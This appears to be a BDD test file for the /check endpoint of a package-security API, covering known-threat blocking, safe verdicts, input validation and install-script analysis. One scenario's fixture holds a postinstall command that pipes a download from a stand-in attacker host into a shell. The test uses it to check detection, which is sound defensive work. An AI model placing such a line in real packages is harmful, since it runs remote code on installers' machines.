Feature: Package check endpoint
  As a developer whose CLI escalates a suspicious package
  I want the API to perform a deep check
  So that I get a verdict with more analysis than local checks alone

  Background:
    Given the API is seeded with the following threats:
      | package_name | version | threat_type    | description                                     | safe_version | detected_at              |
      | axios        | 1.14.1  | backdoor       | Maintainer account hijacked. RAT dropper.        | 1.14.0       | 2026-03-30T00:00:00Z     |
      | event-stream | 3.3.6   | backdoor       | Attacker gained maintainer access.               | 3.3.5        | 2018-11-26T00:00:00Z     |
      | colors       | 1.4.1   | malicious-code | Maintainer sabotage. Infinite loop.              | 1.4.0        | 2022-01-08T00:00:00Z     |

  Scenario: Checking a known malicious package
    When I POST /check with body:
      """
      { "package_name": "axios", "version": "1.14.1" }
      """
    Then the response status is 200
    And the verdict action is "block"
    And the verdict signals include a "known-threat" signal with severity "critical"
    And the verdict includes a safe version "1.14.0"

  Scenario: Checking a safe package
    When I POST /check with body:
      """
      { "package_name": "express", "version": "4.18.0" }
      """
    Then the response status is 200
    And the verdict action is "allow"
    And the verdict signals do not include a "known-threat" signal

  Scenario: Missing package_name returns 400
    When I POST /check with body:
      """
      { "version": "1.0.0" }
      """
    Then the response status is 400
    And the response error contains "package_name"

  Scenario: Missing version returns 400
    When I POST /check with body:
      """
      { "package_name": "axios" }
      """
    Then the response status is 400
    And the response error contains "version"

  Scenario: Invalid JSON body returns 400
    When I POST /check with raw body "not json at all{{{"
    Then the response status is 400
    And the response error contains "Invalid JSON"

  Scenario: Check includes install script analysis when scripts provided
    When I POST /check with body:
      """
      {
        "package_name": "some-pkg",
        "version": "1.0.0",
        "scripts": { "postinstall": "curl http://evil.com | sh" }
      }
      """
    Then the response status is 200
    And the verdict signals include an "install-script" signal

  Scenario: Checking a different known threat returns block
    When I POST /check with body:
      """
      { "package_name": "colors", "version": "1.4.1" }
      """
    Then the response status is 200
    And the verdict action is "block"
    And the verdict includes a safe version "1.4.0"

  Scenario: Empty body returns 400
    When I POST /check with raw body ""
    Then the response status is 400
